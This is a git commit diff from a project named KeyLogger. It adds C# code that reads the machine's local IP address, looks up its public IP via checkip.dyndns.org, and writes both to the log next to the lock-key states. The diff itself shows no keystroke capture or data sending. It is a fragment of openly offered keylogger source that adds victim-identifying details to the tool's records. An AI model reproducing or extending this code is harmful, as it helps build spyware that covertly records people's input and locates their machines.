31cb5a715c6eaf9e036d8a3bdf43c8cdf665bc0b
mahokyin <hokyinma@outlook.com>
2016-01-24 04:53:59 -0800

    Update new function (record ip address)
    Record local ip and public address

--- KeyLogger/KeyLogger/KeyboardStatus.cs
+++ KeyLogger/KeyLogger/KeyboardStatus.cs
@@ -1,9 +1,11 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using System.Web;
 
 public class KeyboardStatus
 {
@@ -24,9 +26,27 @@ public class KeyboardStatus
         numLock = (((ushort)GetKeyState(0x90)) & 0xffff) != 0;
         scrollLock = (((ushort)GetKeyState(0x91)) & 0xffff) != 0;
 
+        // Strategy to get Local IP
+        IPHostEntry IPHost = Dns.GetHostByName(Dns.GetHostName());
+        string ip = IPHost.AddressList[0].ToString();
+
+        // Strategy to get External IP
+        string url = "http://checkip.dyndns.org";
+        System.Net.WebRequest req = System.Net.WebRequest.Create(url);
+        System.Net.WebResponse resp = req.GetResponse();
+        System.IO.StreamReader sr = new System.IO.StreamReader(resp.GetResponseStream());
+        string response = sr.ReadToEnd().Trim();
+        string[] a = response.Split(':');
+        string a2 = a[1].Substring(1);
+        string[] a3 = a2.Split('<');
+        string a4 = a3[0];
+        //////////////////////////////////////////
+
         string capsStatus = "CapsLock: " + capsLock;
         string numStatus = "NumLock: " + numLock;
         string scrollStatus = "ScrollLock: " + scrollLock;
+        TextPrinter.printLine("Public IP Address: " + a4);
+        TextPrinter.printLine("Local IP Address: " + ip);
         TextPrinter.printLine(capsStatus);
         TextPrinter.printLine(numStatus);
         TextPrinter.printLine(scrollStatus);
